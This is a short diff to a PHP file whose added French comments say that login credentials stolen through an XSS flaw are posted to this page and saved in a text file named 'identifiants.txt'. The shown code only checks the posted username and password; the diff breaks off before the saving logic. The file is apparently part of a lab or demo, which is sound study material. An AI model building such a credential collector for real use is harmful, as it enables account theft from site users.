@@ -1,5 +1,8 @@
 <?php
 
+// Les identifiants récupérés via la faille xss sont envoyées sur cette page
+// pour êtres sauvegardés dans un fichier texte
+
 if (isset($_POST['username']) && isset($_POST['password'])) {
 	
 	$file = 'identifiants.txt';
